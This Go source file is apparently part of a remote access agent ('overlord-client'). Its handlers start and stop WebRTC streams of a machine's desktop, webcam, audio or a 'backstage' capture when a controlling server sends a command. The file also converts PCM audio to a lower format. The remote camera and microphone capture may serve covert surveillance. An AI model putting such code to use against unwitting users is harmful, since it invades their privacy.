package handlers

import (
	"context"
	"encoding/binary"
	"fmt"
	"log"
	"net/url"
	"strings"

	"overlord-client/cmd/agent/capture"
	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/webrtcpub"
	"overlord-client/cmd/agent/wire"
)

func pcm16BytesToInt16(chunk []byte) []int16 {
	n := len(chunk) / 2
	out := make([]int16, n)
	for i := 0; i < n; i++ {
		out[i] = int16(binary.LittleEndian.Uint16(chunk[i*2:]))
	}
	return out
}

// WebRTC desktop audio is captured at 48 kHz stereo. Keep the established raw
// WebSocket fallback wire format at 16 kHz mono by averaging each stereo frame
// and decimating groups of three frames. pending preserves sample groups when
// an audio callback ends between frames or decimation windows.
type desktopAudioLegacyConverter struct {
	pending []byte
}

func (c *desktopAudioLegacyConverter) Convert(chunk []byte) []byte {
	if len(chunk) == 0 {
		return nil
	}
	data := make([]byte, 0, len(c.pending)+len(chunk))
	data = append(data, c.pending...)
	data = append(data, chunk...)
	const windowBytes = 3 * 2 * 2 // three stereo PCM16 frames
	windows := len(data) / windowBytes
	if windows == 0 {
		c.pending = append(c.pending[:0], data...)
		return nil
	}
	out := make([]byte, 0, windows*2)
	for window := 0; window < windows; window++ {
		var sum int64
		for frame := 0; frame < 3; frame++ {
			offset := window*windowBytes + frame*4
			left := int32(int16(binary.LittleEndian.Uint16(data[offset:])))
			right := int32(int16(binary.LittleEndian.Uint16(data[offset+2:])))
			sum += int64(left+right) / 2
		}
		sample := int16(sum / 3)
		out = binary.LittleEndian.AppendUint16(out, uint16(sample))
	}
	c.pending = append(c.pending[:0], data[windows*windowBytes:]...)
	return out
}

func kindFromPayload(payload map[string]interface{}) webrtcpub.Kind {
	switch s, _ := payload["kind"].(string); s {
	case "backstage":
		return webrtcpub.Kindbackstage
	case "webcam":
		return webrtcpub.KindWebcam
	case "audio":
		return webrtcpub.KindAudio
	default:
		return webrtcpub.KindDesktop
	}
}

func payloadBool(payload map[string]interface{}, key string, fallback bool) bool {
	if v, ok := payload[key].(bool); ok {
		return v
	}
	return fallback
}

func handleWebrtcPublish(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	whipPath, _ := payload["whipPath"].(string)
	token, _ := payload["token"].(string)
	if whipPath == "" || token == "" {
		sendCommandResultSafe(env, cmdID, false, "missing whipPath/token")
		return nil
	}

	kind := kindFromPayload(payload)
	hasVideo := payloadBool(payload, "hasVideo", kind != webrtcpub.KindAudio)
	hasAudio := payloadBool(payload, "hasAudio", kind == webrtcpub.KindAudio)

	whipURL, err := buildWhipURL(env, whipPath)
	if err != nil {
		sendCommandResultSafe(env, cmdID, false, err.Error())
		return nil
	}

	opts := webrtcpub.Options{
		WhipURL:               whipURL,
		PublishToken:          token,
		TLSInsecureSkipVerify: env.Cfg.TLSInsecureSkipVerify,
		TLSCAPath:             env.Cfg.TLSCAPath,
		HasVideo:              hasVideo,
		HasAudio:              hasAudio,
	}

	goSafe("webrtc publish", env.Cancel, func() {
		if _, err := webrtcpub.Start(ctx, kind, opts); err != nil {
			log.Printf("webrtc: publish[%s] start failed: %v", kind, err)
			_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
				Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error(),
			})
			return
		}
		// Force a fresh SPS/PPS/IDR so the freshly subscribed viewer can
		// decode immediately instead of waiting for the next natural IDR.
		if hasVideo {
			if kind == webrtcpub.Kindbackstage {
				capture.ResetPrevbackstage()
			} else {
				capture.ResetPrev()
			}
		}
		_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type: "command_result", CommandID: cmdID, OK: true,
		})
	})
	return nil
}

func handleWebrtcStop(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	_ = ctx
	if payload != nil {
		webrtcpub.Stop(kindFromPayload(payload))
	} else {
		webrtcpub.StopAll()
	}
	sendCommandResultSafe(env, cmdID, true, "")
	return nil
}

func handleWebrtcP2POffer(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	sessionID, _ := payload["sessionId"].(string)
	offerSDP, _ := payload["sdp"].(string)
	if sessionID == "" || offerSDP == "" {
		sendCommandResultSafe(env, cmdID, false, "missing sessionId/sdp")
		return nil
	}
	kind := kindFromPayload(payload)
	hasVideo := payloadBool(payload, "hasVideo", kind != webrtcpub.KindAudio)
	hasAudio := payloadBool(payload, "hasAudio", kind == webrtcpub.KindAudio)
	kindStr := string(kind)

	callbacks := webrtcpub.P2POfferCallbacks{
		OnICE: func(c webrtcpub.ICECandidate) {
			if c.Candidate == "" {
				return
			}
			_ = wire.WriteMsg(ctx, env.Conn, wire.WebRTCP2PIce{
				Type:          "webrtc_p2p_ice",
				SessionID:     sessionID,
				Kind:          kindStr,
				Candidate:     c.Candidate,
				SDPMid:        c.SDPMid,
				SDPMLineIndex: c.SDPMLineIndex,
			})
		},
		OnClose: func() {
			log.Printf("webrtc: P2P[%s/%s] session closed", kind, sessionID)
		},
		OnBandwidthEstimate: func(bps int) {
			if kind != webrtcpub.KindDesktop {
				return
			}
			if applied := capture.ApplyWebRTCBandwidthEstimate(bps); applied > 0 {
				log.Printf("webrtc: P2P congestion target=%d Mbps applied=%d Mbps", bps/1_000_000, applied/1_000_000)
			}
		},
	}

	answerSDP, err := webrtcpub.StartP2POffer(ctx, kind, sessionID, offerSDP, callbacks, hasVideo, hasAudio)
	if err != nil {
		sendCommandResultSafe(env, cmdID, false, err.Error())
		return nil
	}
	if hasVideo {
		if kind == webrtcpub.Kindbackstage {
			capture.ResetPrevbackstage()
		} else {
			capture.ResetPrev()
		}
	}
	_ = wire.WriteMsg(ctx, env.Conn, wire.WebRTCP2PAnswer{
		Type:      "webrtc_p2p_answer",
		SessionID: sessionID,
		Kind:      kindStr,
		SDP:       answerSDP,
	})
	sendCommandResultSafe(env, cmdID, true, "")
	return nil
}

func handleWebrtcP2PIce(_ context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	sessionID, _ := payload["sessionId"].(string)
	candidate, _ := payload["candidate"].(string)
	mid, _ := payload["sdpMid"].(string)
	var idx uint16
	if v, ok := payloadInt32(payload, "sdpMLineIndex"); ok {
		idx = uint16(v)
	}
	kind := kindFromPayload(payload)
	webrtcpub.AddP2PICECandidate(kind, sessionID, webrtcpub.ICECandidate{
		Candidate:     candidate,
		SDPMid:        mid,
		SDPMLineIndex: idx,
	})
	_ = env
	_ = cmdID
	return nil
}

func handleWebrtcP2PStop(_ context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	sessionID, _ := payload["sessionId"].(string)
	if sessionID == "" {
		webrtcpub.StopAllP2P()
	} else {
		webrtcpub.StopP2P(kindFromPayload(payload), sessionID)
	}
	sendCommandResultSafe(env, cmdID, true, "")
	return nil
}

func buildWhipURL(env *runtime.Env, whipPath string) (string, error) {
	if len(env.Cfg.ServerURLs) == 0 {
		return "", fmt.Errorf("no server URLs configured")
	}
	idx := env.Cfg.ServerIndex
	if idx < 0 || idx >= len(env.Cfg.ServerURLs) {
		idx = 0
	}
	base, err := url.Parse(env.Cfg.ServerURLs[idx])
	if err != nil {
		return "", fmt.Errorf("parse server url: %w", err)
	}
	switch strings.ToLower(base.Scheme) {
	case "wss":
		base.Scheme = "https"
	case "ws":
		base.Scheme = "http"
	}
	if !strings.HasPrefix(whipPath, "/") {
		whipPath = "/" + whipPath
	}
	base.Path = whipPath
	base.RawQuery = ""
	base.Fragment = ""
	return base.String(), nil
}
